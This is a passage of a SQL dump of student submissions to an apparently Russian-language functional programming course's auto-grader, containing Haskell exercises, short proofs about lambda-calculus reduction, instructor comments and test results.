(4432, 127, '355679', '2012-11-30 14:15:53', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n\r\n\r\nf1 >>> f2 = f2 . snd . f1\r\n\r\n\r\n\r\n(f1 >>>= f2) xs = let (x1,xs1) = f1 xs in f2 x1 xs1\r\n\r\n\r\n\r\n-- Найти в списке элемент x, больший 3,\r\n\r\n-- а потом первый элемент, больший x.\r\n\r\nf1 = find (>3) >>>= x -> find (>x)\r\n\r\ntest1 = f1 [1,6,5,7,1,2] == (7,[1,2])\r\n\r\n\r\n\r\n-- Найти в списке элемент x, больший 3,\r\n\r\n-- а потом первый элемент y, меньший x,\r\n\r\n-- а потом первый элемент, не равный сумме x и у.\r\n\r\nf2 = find (>3) >>>= x -> (find (<x) >>>= y -> find (/= x + y))\r\n\r\ntest2 = f2 [3,2,1,4,5,6,7,1,5,5,5,5,6,0,0,0] == (6, [0,0,0])\r\n\r\n\r\n\r\ntest = test1 && test2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4433, 119, '3431532', '2012-11-30 14:17:45', 0, 'dec = \n f x -> n  (g h -> h (g f)) (u -> x) id\r\n\r\n-- решение взято в инете, насколько я его понимаю, тут содержательная часть заключается в  (g h -> h (g f)) (u -> x) id\r\n-- тут мы берем самый верхний вызов (например, в f(f(f(x))) это будет вызов f(тут 2 вложенных вызова) и разворачиваем его (вытаскиваем его аргумент и тем самым делаем -1), с помощью u -> x', 'Не удалось вычислить выражение "let three f x = f (f (f x)) in toInt (dec three)", проверьте правильность синтаксиса'),
(4434, 119, '3431532', '2012-11-30 14:19:21', 1, 'dec = \r\n f x -> n  (g h -> h (g f)) (u -> x) id\r\n\r\ntoInt f = f (x -> x+1) 0\r\n\r\n-- просьба посмотреть предыдущую отправку (там комментарии)\r\n  --- Как не странно, я не могу это сделать, интерфейс это не позволяет, а напрямую обратиться к базе решений я не могу :((\r\n  --- Пришлите, может, комментарии по почте, интересно было бы их посмотреть ', '<br/>Тесты успешно пройдены!'),
(4435, 126, '355679', '2012-11-30 14:29:11', 1, 'Я как раз на занятии хотел спросить, зачем говорить какие-то ещё слова,\r\n\r\nкогда вывод очевиден, но не успел. В общем, если у нас после приминения\r\n\r\nбета-редукци много раз получилось две неупрощаемых формы, то, в силу\r\n\r\nэтого свойства конфлюентности, у нас одна из них либо эквивалентна\r\n\r\nдругой (и тогда всё хорошо), либо существует ещё третья формула,\r\n\r\nкоторую можно вывести из обоих наших. Но они неупрощаемы, так что\r\n\r\nэтот вариант отбрасывается, и остается только первый вариант –\r\n\r\nони эквивалентны.\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4436, 124, '355679', '2012-11-30 14:53:29', 1, 'downUp 1 = print 1 \r\n\r\ndownUp n = do\r\n\r\n	print n\r\n\r\n	downUp (n - 1)\r\n\r\n	print n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4437, 123, '355679', '2012-11-30 15:24:52', 1, 'find cond [] = Nothing\r\n\r\nfind cond (x:xs) = if cond x then Just x else find cond xs\r\n\r\n\r\n\r\nf xs = do\r\n\r\n	x <- find (<5) xs\r\n\r\n	y <- find (>10) xs\r\n\r\n	z <- find (/=7) xs\r\n\r\n	return (x + y + z)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4438, 107, '51559263', '2012-11-30 21:08:49', 2, '  --- Вот так у вас не работает (зациклиается):\r\n  --- Not X == Not X\r\n  --- Исправьте, пожалуйста (а я сейчас добавлю такой тест)\r\n\r\ndata LogExpr = T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | X\r\n\r\n\r\n\r\neval T = T\r\n\r\neval F = F\r\n\r\neval X = X\r\n\r\neval ( And X X ) = X\r\n\r\neval ( Or X X ) = X\r\n\r\neval ( And X ( Not X ) ) = F\r\n\r\neval ( And ( Not X ) X ) = F\r\n\r\neval ( Or X ( Not X ) ) = T\r\n\r\neval ( Or ( Not X ) X ) = T\r\n\r\neval ( And X e ) = X\r\n\r\neval ( And e X ) = X\r\n\r\neval ( Or X e ) = if eval e == T\r\n\r\n                  then T\r\n\r\n			      else X\r\n\r\neval ( Or e X ) = eval ( Or X e )\r\n\r\neval ( Not e ) = Not ( eval e )\r\n\r\neval ( And e1 e2 ) = And ( eval e1 ) ( eval e2 )\r\n\r\neval ( Or e1 e2 ) = Or ( eval e1 ) ( eval e2 )\r\n\r\n\r\n\r\ninstance Eq LogExpr where\r\n\r\n    T == T = True\r\n\r\n    F == F = True\r\n\r\n    T == F = False\r\n\r\n    F == T = False\r\n\r\n    X == T = False\r\n\r\n    X == F = False\r\n\r\n    X == X = True\r\n\r\n    e1 == e2 = eval e1 == eval e2\r\n\r\n    \r\n\r\n	\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4439, 107, 'erwert', '2012-11-30 22:38:19', 0, 'data LogExpr = X | T | F | Or LogExpr LogExpr | And LogExpr LogExpr | Not LogExpr deriving(Show)\r\n\r\ninstance Eq LogExpr where\r\n	a == b = (table a True, table a False) == (table b True, table b False)\r\n	\r\ntable X n = n\r\ntable T n = True\r\ntable F n = False\r\ntable (Not a) n = not x\r\n	where x = table a n\r\ntable (Or a b) n = x || y\r\n	where \r\n		x = table a n\r\n		y = table b n\r\ntable (And a b) n = x && y\r\n	where \r\n		x = table a n\r\n		y = table b n', '<br/>Тесты успешно пройдены!'),
(4440, 107, 'erwert', '2012-12-01 01:35:31', 1, 'data LogExpr = X | T | F | Or LogExpr LogExpr | And LogExpr LogExpr | Not LogExpr deriving(Show)\r\n\r\ninstance Eq LogExpr where\r\n	a == b = (table a True, table a False) == (table b True, table b False)\r\n	\r\ntable X n = n\r\ntable T n = True\r\ntable F n = False\r\ntable (Not a) n = not x\r\n	where x = table a n\r\ntable (Or a b) n = x || y\r\n	where \r\n		x = table a n\r\n		y = table b n\r\ntable (And a b) n = x && y\r\n	where \r\n		x = table a n\r\n		y = table b n', '<br/>Тесты успешно пройдены!'),
(4441, 125, '355679', '2012-12-01 07:41:03', 1, 'Пример: выражение\r\n\r\n(x -> ( (x -> x) 2) + x) 1\r\n\r\nдолжно превратиться в\r\n\r\n(x -> x) 2) + 1,\r\n\r\nа не в\r\n\r\n(1 -> 1) 2) + 1\r\n\r\n\r\n\r\nНадо заменять только те вхождения икса, которые можно назвать "свободными", а не вообще все. То есть те, которые имеют отношение именно к той переменной, которую мы редуцируем, а не к одноименной переменной в какой-нибудь внутренней функции.\r\n\r\n\r\n\r\nИли более формально: "Пусть мы редуцируем выражение << (x -> E) a >>. Для этого нам надо заменить все вхождения x в E, кроме тех, которые внутри Е находятся внутри других функций, имеющих среди своих параметров один, называющийся << x >>."\r\n\r\n\r\n\r\nПример: выражение \r\n\r\n(x -> ((x -> x) 1) + ((y -> x) 69) ) 2\r\n\r\nпревращается в\r\n\r\n((x -> x) 1) + ((y -> 2) 69).\r\n', '<br/>Тесты успешно пройдены!'),
(4442, 107, '51559263', '2012-12-01 11:39:10', 2, '  --- Не совсем так.. Вот два плохих примера:\r\n  ---  F == X\r\n  ---     циклится\r\n  --- And (Or X X) (Not X) == Not X\r\n  ---     выдает неправильный ответ True\r\n  --- Попробуйте исправить, пожалуйста, до понедельника включитально\r\ndata LogExpr = T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | X\r\n\r\neval T = T\r\n\r\neval F = F\r\n\r\neval X = X\r\n\r\neval ( And X X ) = X\r\n\r\neval ( Or X X ) = X\r\n\r\n\r\n\r\neval ( And X ( Not X ) ) = F\r\n\r\neval ( And ( Not X ) X ) = F\r\n\r\neval ( Or X ( Not X ) ) = T\r\n\r\neval ( Or ( Not X ) X ) = T\r\n\r\n\r\n\r\neval ( And X e ) = X\r\n\r\neval ( And e X ) = X\r\n\r\neval ( Or X e ) = if eval e == T\r\n\r\n                  then T\r\n\r\n	          else X\r\n\r\neval ( Or e X ) = eval ( Or X e )\r\n\r\n\r\n\r\neval ( And e ( Not X ) ) = Not X\r\n\r\neval ( And ( Not X ) e ) = Not X\r\n\r\neval ( Or e ( Not X ) ) = if eval e == T\r\n\r\n                          then T\r\n\r\n	                  else Not X\r\n\r\neval ( Or ( Not X ) e ) = eval ( Or e ( Not X ) )\r\n\r\n\r\n\r\neval ( Not e ) = Not ( eval e )\r\n\r\neval ( And e1 e2 ) = And ( eval e1 ) ( eval e2 )\r\n\r\neval ( Or e1 e2 ) = Or ( eval e1 ) ( eval e2 )\r\n\r\n\r\n\r\ninstance Eq LogExpr where\r\n\r\n    T == T = True\r\n\r\n    F == F = True\r\n\r\n    T == F = False\r\n\r\n    F == T = False\r\n\r\n    X == T = False\r\n\r\n    X == F = False\r\n\r\n    X == X = True\r\n\r\n    Not X == X = False\r\n\r\n    X == Not X = False\r\n\r\n    Not X == Not X = True\r\n\r\n    e1 == e2 = eval e1 == eval e2\r\n\r\n    \r\n\r\n	\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4443, 124, 'erwert', '2012-12-01 12:28:59', 1, 'downUp n = du ([n,(n-1)..2] ++ [1..n])\r\n\r\ndu [] = do\r\n	return 0\r\n	\r\ndu (h:hs) = do\r\n	print h\r\n	du hs', '<br/>Тесты успешно пройдены!'),
(4444, 123, 'Deutsche', '2012-12-01 15:06:50', 1, 'find cond [] = Nothing\r\nfind cond (x:s) = if (cond x)\r\n			then Just x\r\n		  else find cond s\r\n\r\nf s = do\r\n	i <- find (<5) s\r\n	j <- find (>10) s\r\n	k <- find (/=7) s\r\n	return (i+j+k)', '<br/>Тесты успешно пройдены!'),
(4445, 124, 'Deutsche', '2012-12-01 15:15:41', 1, 'downUp n = if (n<=0)\r\n		then print "Error: n must be >=1 !!!!!"\r\n	   else	\r\n	   if (n == 1)\r\n		then print n\r\n	   else do\r\n			print n\r\n			downUp (n-1)\r\n			print n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(4446, 122, '82873297', '2012-12-01 17:00:57', 2, '  --- Вообще правильно, но не до конца, потому что параметром функции вполне может быть выражение\r\n  --- Например eval (LetFunc "F" "X" (Mult (Var "X") (Var "X")) (Call "F" (Add (Num 1) (Num 1)))) [] []\r\n  --- Исправьте, пожалуйста (а я сейчас добавлю такой тест)\r\ndata Expr = Var [Char] | Num Integer | Add Expr Expr | Mult Expr Expr | Let [Char] Integer Expr | LetFunc [Char] [Char] Expr Expr | Call [Char] Expr\r\n\r\n\r\n\r\neval (Var x) vs fs = getVal x vs\r\n\r\neval (Num i) _ _ = i\r\n\r\neval (Add e1 e2) vs fs = (eval e1 vs fs)+(eval e2 vs fs)\r\n\r\neval (Mult e1 e2) vs fs = (eval e1 vs fs)*(eval e2 vs fs)\r\n\r\neval (Call f (Num i)) vs fs = (eval(Let (fst fun) i (snd fun)) vs fs) where fun = getFun f fs\r\n\r\neval (Let x v e) vs fs = eval e ((x,v):vs) fs\r\n\r\neval (LetFunc fn v e1 e2) vs fs = eval e2 vs ((fn,v,e1):fs)\r\n\r\n\r\n\r\ngetVal x (xv:xvs) | (fst xv == x) = snd xv\r\n\r\n                  | otherwise = getVal x xvs\r\n\r\n\r\n\r\ngetFun g ((f,x,e):fs) | (f == g) = (x,e)\r\n\r\n                      | otherwise =  getFun g fs', '<br/>Тесты успешно пройдены!'),
(4447, 123, '82873297', '2012-12-01 17:01:13', 1, 'find cnd [] = Nothing\r\n\r\nfind cnd (x:xs) | cnd x = Just x\r\n\r\n                | otherwise = find cnd xs\r\n\r\n\r\n\r\nf xs = do{x<-(find (<5) xs); y<-(find (>10) xs); z<-(find (/=7) xs); Just (x+y+z)}\r\n', '<br/>Тесты успешно пройдены!'),
(4448, 124, '82873297', '2012-12-01 17:02:20', 1, 'downUp n = if n==1 then print 1\r\n\r\n               else do { print n; downUp (n-1); print n;}\r\n', '<br/>Тесты успешно пройдены!'),
(4449, 123, '318210', '2012-12-01 17:09:18', 1, 'find cond [] = Nothing\r\nfind cond (x:xs) = if cond x then (Just x) else find cond xs\r\n\r\nf xs = do x <- find (<5) xs\r\n	  y <- find (>10) xs\r\n	  z <- find (/=7) xs\r\n	  return (x+y+z)', '<br/>Тесты успешно пройдены!'),
(4450, 119, '2118411', '2012-12-01 17:40:46', 1, 'toInt ch = ch (+1) 0\r\n-------------------------------------------------\r\ninc ch = (f x->f (ch f x))\r\nst = pair1 (f x->x) (f x->x)\r\nnext p = pair1 (snd1 p) (inc (snd1 p))\r\ndec n = fst1 (n next st)\r\n\r\npair1 f s = c -> c f s\r\nfst1 p = p (f s -> f)\r\nsnd1 p = p (f s -> s)\r\n', '<br/>Тесты успешно пройдены!'),
(4451, 123, '2118411', '2012-12-01 17:53:43', 1, 'find cond [] = Nothing\r\nfind cond (x:xs) = if cond x then Just x else find cond xs\r\n\r\nf xs = do\r\n        res1 <- find (<5) xs\r\n        res2 <- find (>10) xs\r\n        res3 <- find (/=7) xs\r\n        Just (res1+res2+res3)\r\n', '<br/>Тесты успешно пройдены!'),
(4452, 124, '2118411', '2012-12-01 17:58:43', 2, '   --- Но это не совсем то печатает (только up). Это очень просто, но исправьте, пожалуйста.\r\ndownUp 1 = print 1\r\ndownUp n = do\r\n        print n\r\n        downUp (n-1)\r\n', '<br/>Тесты успешно пройдены!'),
(4453, 126, 'Deutsche', '2012-12-01 20:11:49', 1, 'Предположим, что b и c - нормальные формы исходного лямбда-выражения a.\r\nПо теореме Черча-Россера, если a--->b и a--->c, то существует терм d такой, что b--->d и c--->d. Но т.к. b и c уже имеют нормальную форму, то последовательность редукций, с помощью которых из них может быть получен d, может состоять только из альфа-конверсий, а т.к. это всего лишь операции переименования переменных, то фактически это одна и та же форма (b=c=d).\r\n(Т.о. можно сказать другими словами, что любые две нормальные формы одного лямбда-выражения, если они существуют, то равны с точностью до альфа-конверсий).', '<br/>Тесты успешно пройдены!'),
(4454, 127, '44060', '2012-12-01 20:20:05', 1, 'func f1 f2 xs = let (n, result) = f1 xs in (f2 n) result\r\n--- что-то такое?\r\n  --- Да, или просто \r\n  --- func f1 f2 xs = let (n, result) = f1 xs in f2 n result\r\n  --- (последние скобки не нужны) \r\n', '<br/>Тесты успешно пройдены!'),
(4455, 106, '318210', '2012-12-01 20:30:40', 1, 'isMaj []     _ a = a > 0 \r\nisMaj (x:xs) y a \r\n	| x /= y = isMaj xs y (a - 1) \r\n	| otherwise = isMaj xs y (a + 1) \r\n\r\ncheck _ Nothing = Nothing\r\ncheck xs (Just x) \r\n		| isMaj xs x 0 = Just x \r\n		| otherwise = Nothing \r\n	\r\nfunc [] result _ = result \r\nfunc (x:xs) Nothing 0 = func xs (Just x) 1 \r\nfunc (x:xs) (Just y) z \r\n		| x /= y = if z > 1 then func xs (Just y) (z - 1) else func xs Nothing 0 \r\n		| otherwise = func xs (Just y) (z + 1)\r\n\r\nfindMajor s = check s (func s Nothing 0) \r\n		', '<br/>Тесты успешно пройдены!'),
(4456, 122, '318210', '2012-12-01 21:30:42', 2, '  --- Не совсем так, потому что аргументом Call может быть выражение (не обязательно число)\r\n  --- Исправьте, пожалуйста (а я сейчас добавил такой тест) \r\n\r\ndata Expr = Num Int | Var String | Add Expr Expr| Mult Expr Expr | LetFunc String String Expr Expr| Call String Expr\r\n\r\neval (Var ch) lf (x:xs)\r\n	| fst x == ch = snd x\r\n	| otherwise = eval (Var ch) lf xs\r\n\r\n\r\neval (Num i) _ _ = i\r\n\r\neval (Add e1 e2) lf ln = eval e1 lf ln + eval e2 lf ln\r\neval (Mult e1 e2) lf ln = eval e1 lf ln * eval e2 lf ln\r\n\r\neval (LetFunc f1 v1 e1 e2) lf ln = eval e2 ((f1,(v1,e1)):lf) ln\r\n\r\neval (Call f (Num x)) ((f1,(v1,e1)):lf) ln | f /= f1 = eval (Call f (Num x)) lf ln\r\n					   | otherwise = eval e1 (lf) ((v1,x):ln)\r\n', '<br/>Тесты успешно пройдены!'),
(4457, 127, 'Deutsche', '2012-12-01 21:42:06', 1, '--- ОК', '<br/>Тесты успешно пройдены!'),
(4458, 124, '318210', '2012-12-01 22:03:12', 1, 'downUp n = downUp1 [1..n] n\r\ndownUp1 [x] n = do \r\n		print (n + 1 - x)\r\ndownUp1 (x:xs) n = do\r\n		print (n + 1 -x)\r\n		downUp1 (xs) n\r\n		print (n + 1 -x)\r\n\r\n\r\n\r\n		', '<br/>Тесты успешно пройдены!'),
(4459, 119, '12206137', '2012-12-01 22:21:19', 1, 'fromInt i f x\r\n\r\n    | i == 0 = x\r\n\r\n    | otherwise = f (fromInt (i-1) f x)\r\n\r\ntoInt chNum = chNum (+ 1) 0\r\n\r\n\r\n\r\n-- As expected, it was needed just to represent pair as function. But it appears to be harder, then I thought :(\r\n\r\n\r\n\r\n--newF :: fun -> fun.\r\n\r\n--fun :: .... -> int -> int\r\n\r\n--newF :: (a->int->int) -> (a->int->int)\r\n\r\n--a :: (int -> int)\r\n\r\ndec num f x =\r\n\r\n    let newF prev = cur x -> prev f (cur x) in\r\n\r\n    (num newF) (\\_ x -> x) id x\r\n', '<br/>Тесты успешно пройдены!'),
(4460, 125, '12206137', '2012-12-01 22:35:51', 1, '(x -> (x -> x)) 3 5\r\nПроблема с областями видимости. Решается переименованием переменной (чтобы различные по смыслу переменные имели разные имена), если пытаться все же заменять все вхождения. Либо, если решать на ходу, то просто не входить (заменяя x) в области, начинающиеся с "x->".\r\nЯ не знаю, какая вторая ошибка:( Возможно, в порядке вычисления (вычислится a один раз, или несколько, что может быть важно в случае побочных эффектов или с точки зрения производительности).\r\n  --- Нет, там тоже проблема с областями видимости, только проявляется по другому. ОК, это мы обсудим.', '<br/>Тесты успешно пройдены!'),
(4461, 108, 'hasp', '2012-12-01 22:39:40', 0, 'empty = (_,_) -> False\r\nmyset (x,y) = (a,b) -> a == x || b == y || a + b == x + y || a - b == x - y\r\nadd set p@(x,y) = (a,b) -> (set p)||(a == x || b == y || a + b == x + y || a - b == x - y)\r\n\r\nph n k l set lst = if l == 0 then [zip [1..k] lst] else concatMap (	 -> if set (l,t) then [] else ph n k (l-1) (add set (l,t)) (t:lst) ) [1..n]\r\n\r\nqueens n k = ph n k k empty []', 'Выражение имеет неправильное значение: length (queens 4 4)'),
(4462, 126, '12206137', '2012-12-01 22:40:20', 1, 'Пусть для некоторого выражения существует (по крайней мере) две нормальных формы a и b. По свойству конфлюентности существует форма d, выводимая из обеих. Однако, формы нормальны => невозможно выполнить никаких редукций. Таким образом d совпадает с a. И с b, т.о. a == b.', '<br/>Тесты успешно пройдены!'),
(4463, 108, 'hasp', '2012-12-01 22:52:39', 1, 'empty = (_,_) -> False\r\nmyset (x,y) = (a,b) -> a == x || b == y || a + b == x + y || a - b == x - y\r\nadd set p@(x,y) = (a,b) -> (set (a,b))||(myset p (a,b))\r\n\r\nph n k l set lst = if l == 0 then [zip [1..k] lst] else concatMap (	 -> if set (l,t) then [] else ph n k (l-1) (add set (l,t)) (t:lst) ) [1..n]\r\n\r\nqueens n k = ph n k k empty []', '<br/>Тесты успешно пройдены!'),
(4464, 107, 'hasp', '2012-12-01 22:52:59', 1, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr deriving Show\r\n\r\nevalLog T _ = True\r\nevalLog F _ = False\r\nevalLog X x = x\r\nevalLog (And l r) x = (evalLog l x)&&(evalLog r x)\r\nevalLog (Or  l r) x = (evalLog l x)||(evalLog r x)\r\nevalLog (Not e) x = not (evalLog e x)\r\n\r\ninstance Eq LogExpr where\r\n	a == b = (evalLog a True) == (evalLog b True) && (evalLog a False) == (evalLog b False)', '<br/>Тесты успешно пройдены!'),
(4465, 123, 'hasp', '2012-12-01 22:56:44', 1, 'find _ [] = Nothing\r\nfind p (x:xs) = if p x then Just x else find p xs\r\n\r\nf l = do y <- find (<5) l; x <- find (>10) l; z <- find (/=7) l; return (x+y+z)', '<br/>Тесты успешно пройдены!'),
(4466, 121, '44060', '2012-12-02 08:18:30', 1, 'static int fact_cps(int n, Func<int, int> style){\r\n	if (n>1) return fact_cps(n-1, x => cont (n*x));\r\n        else return style(1);\r\n	}', '<br/>Тесты успешно пройдены!'),
(4467, 106, 'erwert', '2012-12-02 09:50:39', 0, 'findMajor l = foldl (a b -> if (mod  p (b ^ x) == 0) && ((abs $ div p (b ^ x)) >= abs (a ^ x)) then b else a) 0 l\r\n	where \r\n	p = product l\r\n	x = div (length l) 2 + 1', 'Выражение имеет неправильное значение: findMajor [1,2,3,2,2,2,1]'),
(4468, 106, 'erwert', '2012-12-02 09:58:54', 0, 'findMajor l = if r == 0 then Nothing else Just r \r\n	where \r\n	p = product l\r\n	x = div (length l) 2 + 1\r\n	r = foldl (a b -> if (mod  p (b ^ x) == 0) && (abs b > abs a) && ((abs $ div p (b ^ x)) >= abs (a ^ x)) then b else a) 0 l', 'Выражение имеет неправильное значение: findMajor [1,2,3,2,1]'),
(4469, 106, 'erwert', '2012-12-02 09:59:57', 0, 'findMajor l = if r == 1 then Nothing else Just r \r\n	where \r\n	p = product l\r\n	x = div (length l) 2 + 1\r\n	r = foldl (a b -> if (mod  p (b ^ x) == 0) && (abs b > abs a) && ((abs $ div p (b ^ x)) >= abs (a ^ x)) then b else a) 1 l', '<br/>Тесты успешно пройдены!'),
(4470, 123, 'tonyo', '2012-12-02 10:18:52', 0, 'find cond [] = Nothing\r\nfind cond (x:xs) = if cond x then Just x else find cond xs\r\n\r\nf xs = do\r\n  i <- find (<5) xs\r\n  j <- find (>10) xs\r\n  k <- find (/=7) xs\r\n  return (i+j+k)', '<br/>Тесты успешно пройдены!'),
(4471, 122, '82873297', '2012-12-02 10:53:04', 0, '﻿data Expr = Var [Char] | Num Integer | Add Expr Expr | Mult Expr Expr | Let [Char] Integer Expr | LetFunc [Char] [Char] Expr Expr | Call [Char] Expr\r\n\n\r\n\neval (Var x) vs fs = getVal x vs\r\n\neval (Num i) _ _ = i\r\n\neval (Add e1 e2) vs fs = (eval e1 vs fs)+(eval e2 vs fs)\r\n\neval (Mult e1 e2) vs fs = (eval e1 vs fs)*(eval e2 vs fs)\r\n\neval (Call f e1) vs fs = (eval(Let (fst fun) (eval e1 [] []) (snd fun)) vs fs) where fun = getFun f fs\r\n\neval (Let x v e) vs fs = eval e ((x,v):vs) fs\r\n\neval (LetFunc fn v e1 e2) vs fs = eval e2 vs ((fn,v,e1):fs)\r\n\n\r\n\ngetVal x (xv:xvs) | (fst xv == x) = snd xv\r\n\n                  | otherwise = getVal x xvs\r\n\n\r\n\ngetFun g ((f,x,e):fs) | (f == g) = (x,e)\r\n\n                      | otherwise =  getFun g fs\n', 'Не удалось вычислить выражение "eval (LetFunc [''F''] [''X''] (Var [''X'']) (Call [''F''] (Num 5))) [] []", проверьте правильность синтаксиса'),
(4472, 125, 'tonyo', '2012-12-02 12:57:38', 0, 'a. Рассмотрим лямбда выражение:\r\n(x -> (y -> f x y)) y\r\nС одной стороны, если следовать данному на занятии определению, то после бета-редукции получится что-то вроде\r\ny -> f y y\r\nто есть это функция, вычисляющая f с одинаковыми аргументами.\r\nС другой стороны, если сначала использовать альфа-конверсию, получаем:\r\n(x -> (z -> f x z)) y\r\nПосле бета-редукции имеем:\r\nz -> f y z\r\nПолучили не совсем то, что в первом случае. Значит, бета-редукцию сделали не очень правильно.\r\n\r\nб. Можно попробовать исправить так: \r\nПусть есть выражение (x -> e1) e2\r\nтак вот нельзя, чтобы какое-то свободное вхождение переменной в e2 использовалось в какой-то лямбда-абстракции в e1 и после подстановки стало бы связанным.', '<br/>Тесты успешно пройдены!'),
(4473, 107, '442421', '2012-12-02 13:17:59', 0, 'data Expr = X | T | F | N Bool | Not Expr | And Expr Expr | Or Expr Expr deriving Show\r\n\r\n\r\neval T _ = True\r\neval F _ = False\r\neval X x = x\r\neval (N i) _ = i\r\neval (Not a) x = not (eval a x)\r\neval (And a b) x = eval a x && eval b x\r\neval (Or a b) x = eval a x || eval b x\r\n\r\ninstance Eq Expr where\r\n x==y   =  (eval x True== eval y True) && (eval x False== eval y False)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4474, 126, 'tonyo', '2012-12-02 13:28:44', 0, 'Пусть для лямбда выражения А существует две различные нормальные формы B и С. \r\n1. Так как это нормальные формы, то к ним применять бета-редукцию уже невозможно.\r\n2. С другой стороны, по теореме Черча-Россера, для двух выражений B и C, полученных редукциями из А, имеются редукции из B и С до выражения D (причем может быть, что B=D или C=D). Так как B и C различны, то хотя бы для одного из них должна существовать редукция. Но это противоречит с пунктом 1.\r\nПолучаем противоречие.', '<br/>Тесты успешно пройдены!'),
(4475, 107, '51559263', '2012-12-02 14:17:30', 0, 'data LogExpr = T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | X\r\n\n\r\n\neval T = T\r\n\neval F = F\r\n\neval X = X\r\n\n\r\n\n\r\n\neval ( And e X ) = let \r\n\n                       expr = eval e\r\n\n	           in if expr == F || expr == (Not X)\r\n\n                      then F\r\n\n                      else X\r\n\neval ( And X e ) = eval ( And e X )\r\n\n\r\n\n\r\n\neval ( And e ( Not X ) ) = let \r\n\n                               expr = eval e\r\n\n	                   in if expr == F || expr == X\r\n\n                              then F\r\n\n                              else (Not X)\r\n\neval ( And ( Not X ) e ) = eval ( And e ( Not X ) )\r\n\n\r\n\n\r\n\neval ( Or e X ) = let \r\n\n                      expr = eval e\r\n\n	          in if expr == T || expr == (Not X)\r\n\n                     then T\r\n\n                     else X\r\n\neval ( Or X e ) = eval ( Or e X )\r\n\n\r\n\neval ( Or e ( Not X ) ) = let \r\n\n                              expr = eval e\r\n\n	                  in if expr == T || expr == X\r\n\n                             then T\r\n\n                             else (Not X)\r\n\neval ( Or ( Not X ) e ) = eval ( Or e ( Not X ) )\r\n\n\r\n\neval ( Not e ) = Not ( eval e )\r\n\neval ( And e1 e2 ) = And ( eval e1 ) ( eval e2 )\r\n\neval ( Or e1 e2 ) = Or ( eval e1 ) ( eval e2 )\r\n\n\r\n\ninstance Eq LogExpr where\r\n\n    T == T = True\r\n\n    F == F = True\r\n\n    T == F = False\r\n\n    F == T = False\r\n\n    X == T = False\r\n\n    X == F = False\r\n\n    T == X = False\r\n\n    F == X = False\r\n\n    X == X = True\r\n\n    Not X == T = False\r\n\n    T == Not X = False\r\n\n    Not X == F = False\r\n\n    F == Not X = False\r\n\n    Not X == X = False\r\n\n    X == Not X = False\r\n\n    Not X == Not X = True\r\n\n    e1 == e2 = eval e1 == eval e2\r\n\n    \r\n\n	\r\n\n\r\n\n\n', '<br/>Тесты успешно пройдены!'),
(4476, 107, '97440347', '2012-12-02 15:13:00', 0, 'data Expr = X|Not Expr|T|F|And Expr Expr|Or Expr Expr deriving Show\r\ninstance Eq Expr where\r\n  a == b                 = (eval a) == (eval b)\r\neval X = True\r\neval (Not x) = not (eval x)\r\neval T = True\r\neval F = False\r\neval (Or x y) = (eval x)||(eval y)\r\neval (And x y) = (eval x)&&(eval y)', 'Выражение имеет неправильное значение: Or X (And X (Not X)) == T'),
(4477, 107, '97440347', '2012-12-02 15:14:15', 0, 'data Expr = X|Not Expr|T|F|And Expr Expr|Or Expr Expr deriving Show\r\ninstance Eq Expr where\r\n  a == b                 = (eval a) == (eval b)\r\neval X = False\r\neval (Not x) = not (eval x)\r\neval T = True\r\neval F = False\r\neval (Or x y) = (eval x)||(eval y)\r\neval (And x y) = (eval x)&&(eval y)', 'Выражение имеет неправильное значение: F == X'),
(4478, 107, '97440347', '2012-12-02 15:16:25', 0, 'data Expr = X|Not Expr|T|F|And Expr Expr|Or Expr Expr deriving Show\r\ninstance Eq Expr where\r\n  a == b                 = ((eval a) == (eval b))&&((eval2 a) == (eval2 b))\r\neval X = False\r\neval (Not x) = not (eval x)\r\neval T = True\r\neval F = False\r\neval (Or x y) = (eval x)||(eval y)\r\neval (And x y) = (eval x)&&(eval y)\r\neval2 X = True\r\neval2 (Not x) = not (eval x)\r\neval2 T = True\r\neval2 F = False\r\neval2 (Or x y) = (eval x)||(eval y)\r\neval2 (And x y) = (eval x)&&(eval y)', '<br/>Тесты успешно пройдены!'),
(4479, 124, '44060', '2012-12-02 15:56:27', 0, 'downUp n = print (toStr n n True)\r\n	where\r\n		toStr n 1 True = let str = toStr n 2 False in ''1'' : '' '': str\r\n		toStr n k True = let str = toStr n (k-1) True in (show k)++('' '': str)\r\n		toStr n k False = if n==k then (show k)\r\n							else let str = toStr n (k+1) False in (show k)++('' '': str)', '<br/>Тесты успешно пройдены!'),
(4480, 107, '63706456', '2012-12-02 16:15:50', 0, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr\r\n\r\neval (And l r) val = (eval l val) && (eval r val)\r\neval (Or l r) val = (eval l val) || (eval r val)\r\neval T _ = True\r\neval F _ = False\r\neval X val = val\r\n\r\ninstance Eq LogExpr where\r\n	expr1 == expr2 = ((eval expr1 True) == (eval expr2 True)) && ((eval expr1 False) == (eval expr2 False))', 'Не удалось вычислить выражение "Or X (Not X) == T", проверьте правильность синтаксиса'),
(4481, 107, '63706456', '2012-12-02 16:17:29', 0, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr\r\n\r\neval (And l r) val = (eval l val) && (eval r val)\r\neval (Or l r) val = (eval l val) || (eval r val)\r\neval T _ = True\r\neval F _ = False\r\neval X val = val\r\neval (Not expr) val = not (eval expr val)\r\n\r\ninstance Eq LogExpr where\r\n	expr1 == expr2 = 	((eval expr1 True) == (eval expr2 True)) \r\n				&& ((eval expr1 False) == (eval expr2 False))', '<br/>Тесты успешно пройдены!'),
